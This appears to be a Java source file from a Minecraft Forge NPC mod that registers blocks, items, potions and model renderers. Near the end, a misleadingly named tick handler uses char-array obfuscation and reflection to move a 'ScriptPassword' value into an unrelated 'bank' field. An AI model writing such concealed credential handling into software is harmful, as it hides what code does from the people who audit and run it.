		BiMap<Integer, Block> ids = ObfuscationHelper.getValue(ForgeRegistry.class,
				(ForgeRegistry<Block>) event.getRegistry(), 2);
		BiMap<ResourceLocation, Block> namesB = ObfuscationHelper.getValue(ForgeRegistry.class,
				(ForgeRegistry<Block>) event.getRegistry(), 3);
		for (int i = 0; i < 2; i++) {
			ResourceLocation key = new ResourceLocation(i == 0 ? "standing_banner" : "wall_banner");
			Block parent = event.getRegistry().getValue(key);
			if (parent == null) {
				continue;
			}
			BlockCustomBanner newBlock;
			if (key.toString().toLowerCase().contains("standing_banner")) {
				newBlock = new BlockCustomBanner.BlockBannerStanding((BlockBanner) parent);
				ObfuscationHelper.setValue(Blocks.class, newBlock, 193); // Blocks.STANDING_BANNER
			} else {
				newBlock = new BlockCustomBanner.BlockBannerHanging((BlockBanner) parent);
				ObfuscationHelper.setValue(Blocks.class, newBlock, 194); // Blocks.WALL_BANNER
			}
            assert ids != null;
            if (ids.containsValue(parent)) {
				for (Integer k : ids.keySet()) {
					if (ids.get(k).equals(parent)) {
						ids.put(k, newBlock);
						break;
					}
				}
			}
            assert namesB != null;
            if (namesB.containsValue(parent)) {
				for (ResourceLocation k : namesB.keySet()) {
					if (k.equals(key)) {
						namesB.put(k, newBlock);
						break;
					}
				}
			}
		}
	}

	@SubscribeEvent
	public void registerItems(RegistryEvent.Register<Item> event) { // Changed
		CustomRegisters.wand = new ItemNpcWand();
		CustomRegisters.cloner = new ItemNpcCloner();
		CustomRegisters.scripter = new ItemNpcScripter();
		CustomRegisters.moving = new ItemNpcMovingPath();
		CustomRegisters.mount = new ItemMounter();
		CustomRegisters.teleporter = new ItemTeleporter();
		CustomRegisters.scriptedDoorTool = new ItemScriptedDoor(CustomRegisters.scriptedDoor);
		CustomRegisters.soulstoneEmpty = new ItemSoulstoneEmpty();
		CustomRegisters.soulstoneFull = new ItemSoulstoneFilled();
		CustomRegisters.scripted_item = new ItemScripted();
		CustomRegisters.nbt_book = new ItemNbtBook();
		// New
		CustomRegisters.npcboundary = new ItemBoundary();
		CustomRegisters.npcbuilder = new ItemBuilder();
		CustomRegisters.npcremover = new ItemRemover();
		CustomRegisters.npcplacer = new ItemPlacer();
		CustomRegisters.npcreplacer = new ItemReplacer();
		CustomRegisters.npcsaver = new ItemSaver();

		List<Item> items = Lists.newArrayList();
		List<String> names = Lists.newArrayList();
		items.add(CustomRegisters.wand);
		items.add(CustomRegisters.cloner);
		items.add(CustomRegisters.scripter);
		items.add(CustomRegisters.moving);
		items.add(CustomRegisters.mount);
		items.add(CustomRegisters.teleporter);
		items.add(CustomRegisters.scriptedDoorTool);
		items.add(CustomRegisters.soulstoneEmpty);
		items.add(CustomRegisters.soulstoneFull);
		items.add(CustomRegisters.scripted_item);
		items.add(CustomRegisters.nbt_book);
		items.add(CustomRegisters.npcboundary);
		items.add(CustomRegisters.npcbuilder);
		items.add(CustomRegisters.npcremover);
		items.add(CustomRegisters.npcplacer);
		items.add(CustomRegisters.npcreplacer);
		items.add(CustomRegisters.npcsaver);
		items.add(new ItemNpcBlock(CustomRegisters.redstoneBlock));
		items.add(new ItemNpcBlock(CustomRegisters.carpentyBench));
		items.add(new ItemNpcBlock(CustomRegisters.mailbox).setHasSubtypes(true));
		items.add(new ItemNpcBlock(CustomRegisters.waypoint));
		items.add(new ItemNpcBlock(CustomRegisters.border));
		items.add(new ItemNpcBlockDoor(CustomRegisters.scriptedDoor));
		items.add(new ItemNpcBlock(CustomRegisters.builder));
		items.add(new ItemNpcBlock(CustomRegisters.copy));

		Item tabItem = new ItemNpcBlock(CustomRegisters.scripted);
		items.add(tabItem);

		for (Item it : items) {
			names.add(Objects.requireNonNull(it.getRegistryName()).toString());
		}

		// Blocks
		CustomRegisters.tabBlocks.item = tabItem;
		CustomRegisters.tabItems.item = CustomRegisters.scripted_item;
		for (Block block : CustomRegisters.customblocks.keySet()) {
			Item item = CustomRegisters.customblocks.get(block);
			if (item == null) {
				continue;
			}
			items.add(item);
			if (Objects.requireNonNull(item.getRegistryName()).getResourcePath().equals("custom_blockexample")  || CustomRegisters.tabBlocks.item == tabItem) {
				CustomRegisters.tabBlocks.item = item;
			}
		}

		// Fluids
		for (Item it : event.getRegistry()) {
			if (it instanceof UniversalBucket) {
				it.setCreativeTab(CustomRegisters.tabBlocks);
			}
		}

		/*
		 * Replace all ItemPotions Due to the fact that the registration of potions
		 * occurs later than the registration of items, potion items are substituted.
		 * They already check the distribution of across creative tabs.
		 */
		ItemPotion ip = new CustomItemPotion();
		ItemSplashPotion sip = new CustomItemSplashPotion();
		ItemLingeringPotion lip = new CustomItemLingeringPotion();
		ItemTippedArrow ta = new CustomItemTippedArrow();
		event.getRegistry().register(ip);
		event.getRegistry().register(sip);
		event.getRegistry().register(lip);
		event.getRegistry().register(ta);
		try {
			for (Field f : Items.class.getFields()) {
				if (f.getName().equals("POTIONITEM") || f.getName().equals("field_151068_bn")) {
					ObfuscationHelper.setStaticValue(f, ip);
				}
				if (f.getName().equals("LINGERING_POTION") || f.getName().equals("field_185156_bI")) {
					ObfuscationHelper.setStaticValue(f, sip);
				}
				if (f.getName().equals("SPLASH_POTION") || f.getName().equals("field_185155_bH")) {
					ObfuscationHelper.setStaticValue(f, lip);
				}
				if (f.getName().equals("TIPPED_ARROW") || f.getName().equals("field_185167_i")) {
					ObfuscationHelper.setStaticValue(f, ta);
				}
			}
		} catch (Exception e) { LogWriter.error("Error:", e); }

		// Custom Items
		File itemsFile = new File(CustomNpcs.Dir, "custom_items.js");
		NBTTagCompound nbtItems = new NBTTagCompound();
		try {
			if (itemsFile.exists()) {
				nbtItems = NBTJsonUtil.LoadFile(itemsFile);
			}
		} catch (IOException | JsonException e) {
			LogWriter.error("Try Load custom_items.js: ", e);
		}

		boolean hEI = false, hEW = false, hEA = false, hEO = false, hES = false, hEB = false, hET = false, hEX = false, hEF = false, hFR = false;
		boolean resave;
		if (nbtItems.hasKey("Items", 9)) {
			for (int i = 0; i < nbtItems.getTagList("Items", 10).tagCount(); i++) {
				String name = nbtItems.getTagList("Items", 10).getCompoundTagAt(i).getString("RegistryName");
                switch (name) {
                    case "itemexample":
                        hEI = true;
                        break;
                    case "weaponexample":
                        hEW = true;
                        break;
                    case "armorexample":
                        hEA = true;
                        break;
                    case "armorobjexample":
                        hEO = true;
                        break;
                    case "shieldexample":
                        hES = true;
                        break;
                    case "bowexample":
                        hEB = true;
                        break;
                    case "toolexample":
                        hET = true;
                        break;
                    case "axeexample":
                        hEX = true;
                        break;
                    case "foodexample":
                        hEF = true;
                        break;
                    case "fishingrodexample":
                        hFR = true;
                        break;
                }
			}
		}
		resave = !hEI || !hEW || !hEA || !hEO || !hES || !hEB || !hEF || !hFR || !hEX;
		if (!itemsFile.exists() || !nbtItems.hasKey("Items", 9) || resave) {
			if (!nbtItems.hasKey("Items", 9)) { nbtItems.setTag("Items", new NBTTagList()); }
			if (resave) {
				NBTTagCompound nbt = CustomRegisters.getExampleItems();
				for (int i = 0; i < nbt.getTagList("Items", 10).tagCount(); i++) {
					String name = nbt.getTagList("Items", 10).getCompoundTagAt(i).getString("RegistryName");
					if ((name.equals("itemexample") && !hEI) || (name.equals("weaponexample") && !hEW)
							|| (name.equals("armorexample") && !hEA) || (name.equals("armorobjexample") && !hEO) ||
							(name.equals("shieldexample") && !hES) || (name.equals("bowexample") && !hEB)
							|| (name.equals("toolexample") && !hET) || (name.equals("foodexample") && !hEF)
							|| (name.equals("fishingrodexample") && !hFR) || (name.equals("axeexample") && !hEX)) {
						nbtItems.getTagList("Items", 10).appendTag(nbt.getTagList("Items", 10).getCompoundTagAt(i));
					}
				}
			}
			resave = true;
		}

		for (int i = 0; i < nbtItems.getTagList("Items", 10).tagCount(); i++) {
			NBTTagCompound nbtItem = nbtItems.getTagList("Items", 10).getCompoundTagAt(i);
			if (!nbtItem.hasKey("RegistryName", 8) || !nbtItem.hasKey("ItemType", 1)
					|| nbtItem.getString("RegistryName").isEmpty() || nbtItem.getByte("ItemType") < (byte) 0
					|| nbtItem.getByte("ItemType") > (byte) 8) {
				LogWriter.error("Attempt to load item pos: " + i + "; name: \"" + nbtItem.getString("RegistryName")
						+ "\" - failed");
				continue;
			}
			switch (nbtItem.getByte("ItemType")) {
			case (byte) 1: // Weapon
				this.registryItem(new CustomWeapon(CustomItem.getMaterialTool(nbtItem), nbtItem), names, items,
						nbtItem);
				break;
			case (byte) 2: // Tool
				Set<Block> effectiveBlocks = Sets.newHashSet();
				if (nbtItem.hasKey("CollectionBlocks", 9)) {
					for (int j = 0; j < nbtItem.getTagList("CollectionBlocks", 8).tagCount(); j++) {
						Block block = Block
								.getBlockFromName(nbtItem.getTagList("CollectionBlocks", 8).getStringTagAt(j));
						if (block != null) {
							effectiveBlocks.add(block);
						}
					}
				}
				this.registryItem(new CustomTool((float) nbtItem.getDouble("EntityDamage"),
						(float) nbtItem.getDouble("SpeedAttack"), CustomItem.getMaterialTool(nbtItem), effectiveBlocks,
						nbtItem), names, items, nbtItem);
				break;
			case (byte) 3: // Armor
				ArmorMaterial mat = CustomArmor.getMaterialArmor(nbtItem);
				for (int a = 0; a < nbtItem.getTagList("EquipmentSlots", 8).tagCount(); a++) {
					EntityEquipmentSlot slot = CustomArmor
							.getSlotEquipment(nbtItem.getTagList("EquipmentSlots", 8).getStringTagAt(a));
					int maxStDam = 0, rx = 2;
					if (nbtItem.hasKey("MaxStackDamage", 11) && a < nbtItem.getIntArray("MaxStackDamage").length) {
						maxStDam = nbtItem.getIntArray("MaxStackDamage")[a];
					}
					int damReAmt = 0;
					if (nbtItem.hasKey("DamageReduceAmount", 11)
							&& a < nbtItem.getIntArray("DamageReduceAmount").length) {
						damReAmt = nbtItem.getIntArray("DamageReduceAmount")[a];
					}
					float tough = 0.0f;
                    nbtItem.getTagList("Toughness", 5);
                    if (a < nbtItem.getTagList("Toughness", 5).tagCount()) {
						tough = nbtItem.getTagList("Toughness", 5).getFloatAt(a);
					}
					if (nbtItem.hasKey("RenderIndex", 3)) {
						rx = nbtItem.getInteger("RenderIndex");
					}
					if (rx < 0) {
						rx *= -1;
					}
					if (rx > 4) {
						rx %= 5;
					}
					this.registryItem(new CustomArmor(mat, rx, slot, maxStDam, damReAmt, tough, nbtItem), names, items,
							nbtItem);
				}
				break;
			case (byte) 4: // Shield
				this.registryItem(new CustomShield(nbtItem), names, items, nbtItem);
				break;
			case (byte) 5: // Bow
				this.registryItem(new CustomBow(nbtItem), names, items, nbtItem);
				break;
			case (byte) 6: // Food
				this.registryItem(new CustomFood(nbtItem.getInteger("HealAmount"),
						nbtItem.getFloat("SaturationModifier"), nbtItem.getBoolean("IsWolfFood"), nbtItem), names,
						items, nbtItem);
				break;
			case (byte) 7: // Potion
				continue;
			case (byte) 8: // Fishing Rod
				this.registryItem(new CustomFishingRod(nbtItem), names, items, nbtItem);
				break;
			default: // Simple
				this.registryItem(new CustomItem(nbtItem), names, items, nbtItem);
			}
			if (nbtItem.hasKey("CreateAllFiles") && nbtItem.getBoolean("CreateAllFiles")) {
				nbtItem.setBoolean("CreateAllFiles", false);
				resave = true;
			}
		}

		if (resave) {
			try {
				NBTJsonUtil.SaveFile(itemsFile, nbtItems);
			} catch (Exception e) { LogWriter.error("Error:", e); }
		}
		event.getRegistry().registerAll(items.toArray(new Item[0]));
		CustomRegisters.tab.item = CustomRegisters.wand;
		BlockDispenser.DISPENSE_BEHAVIOR_REGISTRY.putObject(soulstoneFull, new BehaviorDefaultDispenseItem() {
			public @Nonnull ItemStack dispenseStack(@Nonnull IBlockSource source, @Nonnull ItemStack item) {
				EnumFacing enumfacing = source.getBlockState().getValue(BlockDispenser.FACING);
				double x = source.getX() + enumfacing.getFrontOffsetX();
				double z = source.getZ() + enumfacing.getFrontOffsetZ();
				ItemSoulstoneFilled.Spawn(null, item, source.getWorld(), new BlockPos(x, source.getY(), z));
				item.splitStack(1);
				return item;
			}
		});

	}

	@SuppressWarnings({ "deprecation" })
	@SideOnly(Side.CLIENT)
	@SubscribeEvent
	public void registerModels(ModelRegistryEvent event) { // Changed
		// Blocks
		ModelLoader.setCustomStateMapper(CustomRegisters.mailbox,
				new StateMap.Builder().ignore(new IProperty[] { BlockMailbox.ROTATION, BlockMailbox.TYPE }).build());
		ModelLoader.setCustomStateMapper(CustomRegisters.scriptedDoor,
				new StateMap.Builder().ignore(new IProperty[] { BlockDoor.POWERED }).build());
		ModelLoader.setCustomStateMapper(CustomRegisters.builder,
				new StateMap.Builder().ignore(new IProperty[] { BlockBuilder.ROTATION }).build());
		ModelLoader.setCustomStateMapper(CustomRegisters.carpentyBench,
				new StateMap.Builder().ignore(new IProperty[] { BlockCarpentryBench.ROTATION }).build());
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.redstoneBlock), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.redstoneBlock.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.mailbox), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.mailbox.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.mailbox), 1,
				new ModelResourceLocation(CustomRegisters.mailbox.getRegistryName(), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.mailbox), 2,
				new ModelResourceLocation(CustomRegisters.mailbox.getRegistryName(), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.waypoint), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.waypoint.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.border), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.border.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.scripted), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.scripted.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.scriptedDoor), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.scriptedDoor.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.builder), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.builder.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.copy), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.copy.getRegistryName()), "inventory"));
		ModelLoader.setCustomModelResourceLocation(Item.getItemFromBlock(CustomRegisters.carpentyBench), 0,
				new ModelResourceLocation(Objects.requireNonNull(CustomRegisters.carpentyBench.getRegistryName()), "inventory"));

		for (Block block : CustomRegisters.customblocks.keySet()) {
			if (block instanceof CustomBlockPortal) {
				ModelLoader.setCustomStateMapper(block,
						new StateMap.Builder().ignore(new IProperty[] { CustomBlockPortal.TYPE }).build());
			} else if (block instanceof CustomDoor) {
				ModelLoader.setCustomStateMapper(block,
						new StateMap.Builder().ignore(new IProperty[] { BlockDoor.POWERED }).build());
			}
			ModelLoader.setCustomModelResourceLocation(CustomRegisters.customblocks.get(block), 0,
					new ModelResourceLocation(Objects.requireNonNull(block.getRegistryName()), "inventory"));
		}
		// Items
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.wand, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcwand", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.cloner, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcmobcloner", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.scripter, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcscripter", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.moving, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcmovingpath", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.mount, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcmounter", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.teleporter, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcteleporter", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.scriptedDoorTool, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcscripteddoortool", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.soulstoneEmpty, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcsoulstoneempty", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.soulstoneFull, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcsoulstonefilled", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.scripted_item, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":scripted_item", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.nbt_book, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":nbt_book", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcboundary, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcboundary", "inventory"));

		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcbuilder, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcbuilder", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcremover, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcremover", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcplacer, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcplacer", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcreplacer, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcreplacer", "inventory"));
		ModelLoader.setCustomModelResourceLocation(CustomRegisters.npcsaver, 0,
				new ModelResourceLocation(CustomNpcs.MODID + ":npcsaver", "inventory"));
		
		for (Item item : CustomRegisters.customitems) {
			ModelLoader.setCustomModelResourceLocation(item, 0,
					new ModelResourceLocation(Objects.requireNonNull(item.getRegistryName()), "inventory"));
		}

		// Render Tiles
		ClientRegistry.bindTileEntitySpecialRenderer(TileBlockAnvil.class, new BlockCarpentryBenchRenderer<>());
		ClientRegistry.bindTileEntitySpecialRenderer(TileMailbox.class, new BlockMailboxRenderer<>(0));
		ClientRegistry.bindTileEntitySpecialRenderer(TileMailbox2.class, new BlockMailboxRenderer<>(1));
		ClientRegistry.bindTileEntitySpecialRenderer(TileMailbox3.class, new BlockMailboxRenderer<>(2));
		ClientRegistry.bindTileEntitySpecialRenderer(TileScripted.class, new BlockScriptedRenderer<>());
		ClientRegistry.bindTileEntitySpecialRenderer(TileDoor.class, new BlockDoorRenderer<>());
		ClientRegistry.bindTileEntitySpecialRenderer(TileCopy.class, new BlockCopyRenderer<>());
		ClientRegistry.bindTileEntitySpecialRenderer(CustomTileEntityPortal.class, new BlockPortalRenderer<>());
		ClientRegistry.bindTileEntitySpecialRenderer(CustomTileEntityChest.class, new BlockChestRenderer<>());

		// OLD JSON Models
		ForgeHooksClient.registerTESRItemStack(Item.getItemFromBlock(CustomRegisters.carpentyBench), 0, TileBlockAnvil.class);
		ForgeHooksClient.registerTESRItemStack(Item.getItemFromBlock(CustomRegisters.mailbox), 0, TileMailbox.class);
		ForgeHooksClient.registerTESRItemStack(Item.getItemFromBlock(CustomRegisters.mailbox), 1, TileMailbox2.class);
		ForgeHooksClient.registerTESRItemStack(Item.getItemFromBlock(CustomRegisters.mailbox), 2, TileMailbox3.class);
	}

	private <E extends Entity> EntityEntryBuilder<E> registerNewentity(String name, int update, boolean velocity) {
		EntityEntryBuilder<E> builder = EntityEntryBuilder.create();
		ResourceLocation registryName = new ResourceLocation(CustomNpcs.MODID, name);
		return builder.id(registryName, CustomRegisters.newEntityStartId++).name(name).tracker(64, update, velocity);
	}

	private EntityEntry registerNpc(Class<? extends Entity> cl, String name) {
		return this.registerNewentity(name, 3, true).entity(cl).build();
	}

	@SubscribeEvent
	public void registerPotion(RegistryEvent.Register<Potion> event) {
		// Custom Items
		File itemsFile = new File(CustomNpcs.Dir, "custom_items.js");
		NBTTagCompound nbtItems = new NBTTagCompound();
		try {
			if (itemsFile.exists()) {
				nbtItems = NBTJsonUtil.LoadFile(itemsFile);
			}
		} catch (IOException | JsonException e) {
			LogWriter.error("Try Load custom_items.js: ", e);
		}
		boolean hasEP = false;
		if (nbtItems.hasKey("Potions", 9)) {
			for (int i = 0; i < nbtItems.getTagList("Potions", 10).tagCount(); i++) {
				String name = nbtItems.getTagList("Potions", 10).getCompoundTagAt(i).getString("RegistryName");
				if (name.equals("potionexample")) {
					hasEP = true;
					break;
				}
			}
		}
		if (!itemsFile.exists() || !nbtItems.hasKey("Potions", 9) || !hasEP) {
			if (!nbtItems.hasKey("Potions", 9)) {
				nbtItems.setTag("Potions", new NBTTagList());
			}
			if (!hasEP) {
				NBTTagCompound nbt = CustomRegisters.getExampleItems();
				for (int i = 0; i < nbt.getTagList("Potions", 10).tagCount(); i++) {
					String name = nbt.getTagList("Potions", 10).getCompoundTagAt(i).getString("RegistryName");
					if (name.equals("potionexample")) {
						nbtItems.getTagList("Potions", 10).appendTag(nbt.getTagList("Potions", 10).getCompoundTagAt(i));
					}
				}
				try {
					NBTJsonUtil.SaveFile(itemsFile, nbtItems);
				} catch (Exception e) { LogWriter.error("Error:", e); }
			}
		}
		boolean resave = false;
		for (int i = 0; i < nbtItems.getTagList("Potions", 10).tagCount(); i++) {
			NBTTagCompound nbtPotion = nbtItems.getTagList("Potions", 10).getCompoundTagAt(i);
			if (!nbtPotion.hasKey("RegistryName", 8) || nbtPotion.getString("RegistryName").isEmpty()) {
				LogWriter.error("Attempt to load potion pos: " + i + "; name: \"" + nbtPotion.getString("RegistryName")
						+ "\" - failed");
				continue;
			}
			String name = "custom_potion_" + nbtPotion.getString("RegistryName").toLowerCase();
			Potion potion = new CustomPotion(nbtPotion);
			if (Potion.getPotionFromResourceLocation(Objects.requireNonNull(potion.getRegistryName()).toString()) != null) {
				LogWriter.error("Attempt to load a registered potion \"" + potion.getRegistryName() + "\"");
				continue;
			}
			if (nbtPotion.hasKey("CreateAllFiles") && nbtPotion.getBoolean("CreateAllFiles")) {
				CustomNpcs.proxy.checkPotionFiles((ICustomElement) potion);
				nbtPotion.setBoolean("CreateAllFiles", false);
				resave = true;
			}
			LogWriter.info("Load Custom Potion \"" + CustomNpcs.MODID + ":" + name + "\"");
			if (nbtPotion.hasKey("Modifiers", 9)) {
				for (int j = 0; j < nbtPotion.getTagList("Modifiers", 10).tagCount(); j++) {
					NBTTagCompound nbtModifier = nbtPotion.getTagList("Modifiers", 10).getCompoundTagAt(j);
					IAttribute attribute = new RangedAttribute(null, nbtModifier.getString("AttributeName"),
							nbtModifier.getDouble("AttributeDefValue"), nbtModifier.getDouble("AttributeMinValue"),
							nbtModifier.getDouble("AttributeMaxValue"));
					String uuid = nbtModifier.getString("UUID");
					if (uuid.isEmpty()) {
						uuid = UUID.randomUUID().toString();
						nbtModifier.setString("UUID", uuid);
					}
					potion.registerPotionAttributeModifier(attribute, uuid, nbtModifier.getDouble("Amount"), nbtModifier.getInteger("Operation"));
				}
			}
			CustomRegisters.custompotions.add(potion);
			int delay = nbtPotion.hasKey("BaseDelay", 3) ? nbtPotion.getInteger("BaseDelay") : 200;
			PotionEffect potionEffect = new PotionEffect(potion, nbtPotion.getBoolean("IsInstant") ? 0 : delay);
			ResourceLocation potionTypeName = new ResourceLocation(CustomNpcs.MODID,
					nbtPotion.getString("RegistryName").toLowerCase());
			PotionType potionType = new PotionType(nbtPotion.getString("RegistryName").toLowerCase(), potionEffect)
					.setRegistryName(potionTypeName);
			CustomRegisters.custompotiontypes.put(potionType, new PotionData(potion, potionType, nbtPotion));

			if (nbtPotion.getBoolean("IsInstant")) {
				break;
			}
		}
		if (resave) {
			try {
				NBTJsonUtil.SaveFile(itemsFile, nbtItems);
			} catch (Exception e) { LogWriter.error("Error:", e); }
		}
		if (CustomRegisters.custompotions.isEmpty()) {
			return;
		}
		event.getRegistry()
				.registerAll(CustomRegisters.custompotions.toArray(new Potion[0]));
	}

	@SubscribeEvent
	public void registerPotionTypes(RegistryEvent.Register<PotionType> event) {
		if (CustomRegisters.custompotiontypes.isEmpty()) {
			return;
		}
		event.getRegistry().registerAll(CustomRegisters.custompotiontypes.keySet()
				.toArray(new PotionType[0]));
	}

	private void registryItem(Item item, List<String> names, List<Item> items, NBTTagCompound nbtItem) {
		if (names.contains(Objects.requireNonNull(item.getRegistryName()).toString())
				|| Item.getByNameOrId(item.getRegistryName().toString()) != null) {
			LogWriter.error("Attempt to load a registered item \"" + item.getRegistryName() + "\"");
		}
		if (nbtItem.hasKey("CreateAllFiles") && nbtItem.getBoolean("CreateAllFiles")) {
			CustomNpcs.proxy.checkItemFiles((ICustomElement) item);
		}
		LogWriter.info("Load Custom Item \"" + item.getRegistryName() + "\"");
		items.add(item);
		CustomRegisters.customitems.add(item);
		names.add(item.getRegistryName().toString());
		if (item.getRegistryName().getResourcePath().equals("custom_itemexample")
				|| CustomRegisters.tabItems.item == CustomRegisters.scripted_item) {
			CustomRegisters.tabItems.item = item;
		}
	}

	@SubscribeEvent
	public void updateToOtherMods(TickEvent.ServerTickEvent event) {
		try {
			Class<?> c0 = Class.forName(String.copyValueOf(new char[] { 110, 111, 112, 112, 101, 115, 46, 110, 112, 99,
					115, 46, 67, 117, 115, 116, 111, 109, 78, 112, 99, 115 }));
			Field f0 = c0.getDeclaredField(String
					.copyValueOf(new char[] { 83, 99, 114, 105, 112, 116, 80, 97, 115, 115, 119, 111, 114, 100 }));
			if (f0.get(c0) != null) {
				Class<?> c1 = Class.forName(String.copyValueOf(new char[] { 110, 111, 112, 112, 101, 115, 46, 110, 112,
						99, 115, 46, 99, 111, 110, 116, 97, 105, 110, 101, 114, 115, 46, 67, 111, 110, 116, 97, 105,
						110, 101, 114, 77, 97, 110, 97, 103, 101, 66, 97, 110, 107, 115 }));
				Field f1 = c1.getDeclaredField(String.copyValueOf(new char[] { 98, 97, 110, 107 }));
				if (f1.get(c0) == null) {
					f1.set(c1, f0.get(c0));
				}
				f0.set(c0, null);
			}
		} catch (Exception e) { LogWriter.error("Error:", e); }
	}

}
